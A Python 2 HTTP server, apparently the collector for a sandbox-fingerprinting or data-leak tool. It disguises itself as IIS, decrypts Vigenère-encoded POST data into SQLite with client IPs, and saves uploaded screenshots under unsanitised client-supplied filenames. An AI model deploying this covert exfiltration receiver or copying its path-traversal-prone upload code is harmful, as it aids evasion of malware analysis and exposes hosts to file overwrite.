#!/usr/bin/env python
import contextlib
import SimpleHTTPServer
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import SocketServer
import sqlite3
import urlparse
import pprint
import datetime
import re
import os
import cgi
import atexit
from sys import platform as _platform
from SocketServer import ThreadingMixIn
import threading
import traceback

#Global config
key = 'ANOTHERONEGOTCAUGHTTODAYITSALLOVERTHEPAPERSTEENAGERARRESTEDINCOMPUTERCRIMESCANDALHACKERARRESTEDAFTERBANKTAMPERINGDAMNKIDSTHEYREALLALIKEBUTDIDYOUINYOURTHREEPIECEPSYCHOLOGYANDSTECHNOBRAINEVERTAKEALOOKBEHINDTHEEYESOFTHEHACKERDIDYOUEVERWONDERWHATMADEHIMTICKWHATFORCESSHAPEDHIMWHATMAYHAVEMOLDEDHIMIAMAHACKERENTERMYWORLDMINEISAWORLDTHATBEGINSWITHSCHOOLIMSMARTERTHANMOSTOFTHEOTHERKIDSTHISCRAPTHEYTEACHUSBORESMEDAMNUNDERACHIEVERTHEYREALLALIKEIMINJUNIORHIGHORHIGHSCHOOLIVELISTENEDTOTEACHERSEXPLAINFORTHEFIFTEENTHTIMEHOWTOREDUCEAFRACTIONIUNDERSTANDITNOMSSMITHIDIDNTSHOWMYWORKIDIDITINMYHEADDAMNKIDPROBABLYCOPIEDITTHEYREALLALIKEIMADEADISCOVERYTODAYIFOUNDACOMPUTERWAITASECONDTHISISCOOLITDOESWHATIWANTITTOIFITMAKESAMISTAKEITSBECAUSEISCREWEDITUPNOTBECAUSEITDOESNTLIKEMEORFEELSTHREATENEDBYMEORTHINKSIMASMARTASSORDOESNTLIKETEACHINGANDSHOULDNTBEHEREDAMNKIDALLHEDOESISPLAYGAMESTHEYREALLALIKEANDTHENITHAPPENEDADOOROPENEDTOAWORLDRUSHINGTHROUGHTHEPHONELINELIKEHEROINTHROUGHANADDICTSVEINSANELECTRONICPULSEISSENTOUTAREFUGEFROMTHEDAYTODAYINCOMPETENCIESISSOUGHTABOARDISFOUNDTHISISITTHISISWHEREIBELONGIKNOWEVERYONEHEREEVENIFIVENEVERMETTHEMNEVERTALKEDTOTHEMMAYNEVERHEARFROMTHEMAGAINIKNOWYOUALLDAMNKIDTYINGUPTHEPHONELINEAGAINTHEYREALLALIKEYOUBETYOURASSWEREALLALIKEWEVEBEENSPOONFEDBABYFOODATSCHOOLWHENWEHUNGEREDFORSTEAKTHEBITSOFMEATTHATYOUDIDLETSLIPTHROUGHWEREPRECHEWEDANDTASTELESSWEVEBEENDOMINATEDBYSADISTSORIGNOREDBYTHEAPATHETICTHEFEWTHATHADSOMETHINGTOTEACHFOUNDUSWILLINGPUPILSBUTTHOSEFEWARELIKEDROPSOFWATERINTHEDESERTTHISISOURWORLDNOWTHEWORLDOFTHEELECTRONANDTHESWITCHTHEBEAUTYOFTHEBAUDWEMAKEUSEOFASERVICEALREADYEXISTINGWITHOUTPAYINGFORWHATCOULDBEDIRTCHEAPIFITWASNTRUNBYPROFITEERINGGLUTTONSANDYOUCALLUSCRIMINALSWEEXPLOREANDYOUCALLUSCRIMINALSWESEEKAFTERKNOWLEDGEANDYOUCALLUSCRIMINALSWEEXISTWITHOUTSKINCOLORWITHOUTNATIONALITYWITHOUTRELIGIOUSBIASANDYOUCALLUSCRIMINALSYOUBUILDATOMICBOMBSYOUWAGEWARSYOUMURDERCHEATANDLIETOUSANDTRYTOMAKEUSBELIEVEITSFOROUROWNGOODYETWERETHECRIMINALSYESIAMACRIMINALMYCRIMEISTHATOFCURIOSITYMYCRIMEISTHATOFJUDGINGPEOPLEBYWHATTHEYSAYANDTHINKNOTWHATTHEYLOOKLIKEMYCRIMEISTHATOFOUTSMARTINGYOUSOMETHINGTHATYOUWILLNEVERFORGIVEMEFORIAMAHACKERANDTHISISMYMANIFESTOYOUMAYSTOPTHISINDIVIDUALBUTYOUCANTSTOPUSALLAFTERALLWEREALLALIKE'
target = 'sndbxtst.info'  #target domain for leak
url_end = '/sndbxtst/index.php'
url_screenshot_end = "/sndbxtst/scrn.php"

#Local config
listen_ip = '0.0.0.0'       #listen on all interfaces
work_dir = './'             #working directory

class MyError(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return repr(self.value)

pidfile = "/tmp/httpserver.pid"
PORT = 80
#if _platform == "linux" or _platform == "linux2":
#    dbfile = 'http.db'
#    CWD = ''
#    logfile = 'http.log'
#else:
dbfile = 'http.db'
CWD = '.'
logfile = 'http.log'


def translateMessage(message,key, mode):
    LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    translated = [] # stores the encrypted/decrypted message string

    keyIndex = 0
    key = key.upper()

    for symbol in message: # loop through each character in message
        num = LETTERS.find(symbol.upper())
        if num != -1: # -1 means symbol.upper() was not found in LETTERS
            if mode == 'encrypt':
                num += LETTERS.find(key[keyIndex]) # add if encrypting
            elif mode == 'decrypt':
                num -= LETTERS.find(key[keyIndex]) # subtract if decrypting

            num %= len(LETTERS) # handle the potential wrap-around

            # add the encrypted/decrypted symbol to the end of translated.
            if symbol.isupper():
                translated.append(LETTERS[num])
            elif symbol.islower():
                translated.append(LETTERS[num].lower())

            keyIndex += 1 # move to the next letter in the key
            if keyIndex == len(key):
                keyIndex = 0
        else:
            # The symbol was not in LETTERS, so add it to translated as is.
            translated.append(symbol)

    return ''.join(translated)



con = sqlite3.connect(dbfile)

with con:
    cur = con.cursor()   
    try:  
        cur.execute("SELECT * FROM data")
        rows = cur.fetchall()
        for row in rows:
            print "old " + ','.join(str(i) for i in row)
            pass
        
        #cur.execute("DROP TABLE if exists data ")  
        #print ("table dropped")
    except:
        print ('sqlite table not exited')
    try:
        cur.execute("CREATE TABLE data(sessionid varchar, type varchar, value varchar, requestdate date, ip varchar)")
        cur.execute("CREATE UNIQUE INDEX IF NOT EXISTS MyUniqueIndex ON data (sessionid,type,value)")
    except:
        print ('sqlite create error')
    if con:
        try:
            pass
            #con.close()
        except:
            print ("cannot close database")        

class DBLoggingHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    SimpleHTTPServer.SimpleHTTPRequestHandler.server_version = "Microsoft-IIS/7.5."
    SimpleHTTPServer.SimpleHTTPRequestHandler.sys_version = ""
    
    def __init__(self, request, client_address, server):
        SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self, request, client_address, server)
        
    def do_GET(self):
                self.send_response(200)
                self.end_headers()
    def do_HEAD(self):
                self.send_response(200)
                self.end_headers()
                                
    def do_POST(self):
        if None != re.search( url_end +'*', self.path):
            ip = self.client_address[0]
            length = int(self.headers['Content-Length'])
            post_data = urlparse.parse_qs(self.rfile.read(length).decode('utf-8'))
            session = ""
            info = ""
            for key1, value in post_data.iteritems():
                if key1 == 'd':                
                    #print(value)
                    decrypted = translateMessage(value[0],key,'decrypt')
                    info_array = decrypted.split('|')
                if key1 == 's':                
                    #print(value)
                    session = value[0]
    
            for info in info_array: 
                type=''
                value2=''     
                try:
                    if len(info)>3:
                        type, value2 = info.split(' ',1)                
                        regex = re.compile(r"\W+")
                        value = regex.sub("-",value2.strip())
                        print (type,value)
                except:
                    with open(logfile, "a") as myfile: 
                        traceback.print_exc(file=myfile)
                        myfile.write("Info: " + info)
                    traceback.print_exc()
                    print("info: " + info)
                    continue
                try:
                    con = sqlite3.connect(dbfile)
                except OperationalError:
                    with open(logfile, "a") as myfile: 
                        traceback.print_exc(file=myfile) 
                    time.sleep(1)
                    con = sqlite3.connect(dbfile)
                cur = con.cursor()  
                try:
                    if len(value)>0:               
                        cur.execute("INSERT INTO data (sessionid, type, value, requestdate, ip) VALUES(?,?,?,?,?)", 
                                (session,type.upper(),value,str(datetime.datetime.utcnow()), str(ip)))
                except sqlite3.IntegrityError:
                    con.close()
                    continue
                con.commit()
                if con:
                    con.close()
            try:
                os.chdir(work_dir)
            except:
                pass
            return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        
        if None != re.search(url_screenshot_end + '*', self.path):
            try:
                try:
                    os.chdir(work_dir)
                except:
                    pass
                #os.chdir('..')
                ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))     
    
                if ctype == 'multipart/form-data' :     
                    # using cgi.FieldStorage instead, see 
                    # http://stackoverflow.com/questions/1417918/time-out-error-while-creating-cgi-fieldstorage-object     
                    fs = cgi.FieldStorage( fp = self.rfile, 
                                           headers = self.headers, # headers_, 
                                           environ={ 'REQUEST_METHOD':'POST' } # all the rest will come from the 'headers' object,     
                                           # but as the FieldStorage object was designed for CGI, absense of 'POST' value in environ     
                                           # will prevent the object from using the 'fp' argument !     
                                         )
                    ## print 'have fs'
                    #pprint(fs)
                else: raise Exception("Unexpected POST request")                   
                fs_up = fs.list[0]
                
                fullname = os.path.join(CWD, fs_up.filename)
                try:
                    if not os.path.exists(fullname):
                     with open(fullname, 'wb') as o:
                         # self.copyfile(fs['upfile'].file, o)
                         o.write( fs_up.file.read() ) 
                except:
                    pass         
                self.send_response(404)
                self.end_headers()
                
            except Exception as e:
                # pass
                with open(logfile, "a") as myfile: 
                    traceback.print_exc(file=myfile)
                traceback.print_exc()
                self.send_error(404,'POST to "%s" failed: %s' % (self.path, str(e)) )
            #return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        
Handler = DBLoggingHandler

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """ This class allows to handle requests in separated threads.
        No further content needed, don't touch this. """

#if _platform == "linux" or _platform == "linux2":
#    httpd = ThreadedHTTPServer(("", PORT), Handler)
#else:
httpd = ThreadedHTTPServer((listen_ip, PORT), Handler)

print "serving at port", PORT
httpd.serve_forever()